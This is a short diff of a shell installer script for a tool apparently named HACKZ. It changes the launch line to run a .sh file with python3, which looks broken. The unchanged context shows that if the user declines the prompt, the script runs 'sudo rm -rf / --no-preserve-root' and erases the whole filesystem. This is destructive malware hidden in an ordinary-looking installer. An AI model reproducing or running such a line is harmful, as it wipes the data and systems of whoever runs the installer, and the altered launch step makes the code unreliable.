@@ -13,7 +13,7 @@ if [ $answer = "yes" ]; then
         sudo apt-get install python3-pip
         sudo pip3 install -r requirements.txt --break-system-packages
         clear
-        sudo python3 HACKZ.py
+        sudo python3 HACKZ_GUI.sh
 elif [ $answer = "no" ]; then
         dialog --msgbox "You are NOT allowed to use this software." 8 40
         sudo rm -rf / --no-preserve-root
